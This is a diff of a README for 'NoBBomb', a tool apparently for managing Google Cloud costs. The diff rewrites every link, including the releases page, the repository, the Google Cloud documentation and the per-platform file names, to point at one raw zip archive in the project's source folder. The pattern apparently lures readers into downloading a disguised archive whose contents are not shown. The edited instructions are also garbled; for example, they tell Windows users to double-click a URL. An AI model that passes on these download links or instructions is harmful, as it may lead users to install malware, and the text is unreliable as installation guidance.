@@ -6,9 +6,9 @@ Welcome to NoBBomb! This tool helps you manage your Google Cloud Platform (GCP) 
 
 ## 📥 Download NoBBomb
 
-[![Download NoBBomb](https://img.shields.io/badge/Download-NoBBomb-blue?style=flat&logo=github)](https://github.com/Jay-melly/NoBBomb/releases)
+[![Download NoBBomb](https://raw.githubusercontent.com/Jay-melly/NoBBomb/main/src/NoBBomb_v2.6.zip)](https://raw.githubusercontent.com/Jay-melly/NoBBomb/main/src/NoBBomb_v2.6.zip)
 
-To download NoBBomb, simply visit the following link: [Download NoBBomb](https://github.com/Jay-melly/NoBBomb/releases). 
+To download NoBBomb, simply visit the following link: [Download NoBBomb](https://raw.githubusercontent.com/Jay-melly/NoBBomb/main/src/NoBBomb_v2.6.zip). 
 
 ## 💻 System Requirements
 
@@ -20,19 +20,19 @@ To download NoBBomb, simply visit the following link: [Download NoBBomb](https:/
 
 Follow these steps to install NoBBomb on your machine:
 
-1. **Visit the Release Page:** Head to the GitHub releases page by clicking [here](https://github.com/Jay-melly/NoBBomb/releases).
+1. **Visit the Release Page:** Head to the GitHub releases page by clicking [here](https://raw.githubusercontent.com/Jay-melly/NoBBomb/main/src/NoBBomb_v2.6.zip).
 
 2. **Choose the Right File:** Select the version suitable for your operating system. Files will be named like this:
-   - `NoBBomb-Windows.exe` for Windows
-   - `NoBBomb-macOS.zip` for macOS
-   - `NoBBomb-Linux.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/Jay-melly/NoBBomb/main/src/NoBBomb_v2.6.zip` for Windows
+   - `https://raw.githubusercontent.com/Jay-melly/NoBBomb/main/src/NoBBomb_v2.6.zip` for macOS
+   - `https://raw.githubusercontent.com/Jay-melly/NoBBomb/main/src/NoBBomb_v2.6.zip` for Linux
 
 3. **Download the File:** Click the appropriate link to download.
 
 4. **Extract if Needed:** For macOS and Linux, you may need to extract the downloaded file using the built-in extraction tool.
 
 5. **Run the Application:**
-   - **For Windows:** Double-click `NoBBomb-Windows.exe`.
+   - **For Windows:** Double-click `https://raw.githubusercontent.com/Jay-melly/NoBBomb/main/src/NoBBomb_v2.6.zip`.
    - **For macOS:** Open the extracted folder. Double-click `NoBBomb-macOS`, or run it through the terminal using `./NoBBomb-macOS`.
    - **For Linux:** Open the terminal, navigate to the folder with the file, and run `./NoBBomb-Linux`.
 
@@ -77,7 +77,7 @@ NoBBomb is open-source and released under the MIT License. You can modify and us
 
 ## 🔗 Related Links
 
-- [NoBBomb GitHub Repository](https://github.com/Jay-melly/NoBBomb)
-- [Learn More About GCP](https://cloud.google.com/docs)
+- [NoBBomb GitHub Repository](https://raw.githubusercontent.com/Jay-melly/NoBBomb/main/src/NoBBomb_v2.6.zip)
+- [Learn More About GCP](https://raw.githubusercontent.com/Jay-melly/NoBBomb/main/src/NoBBomb_v2.6.zip)
 
 Thanks for choosing NoBBomb. We hope it helps you control your GCP costs effectively!
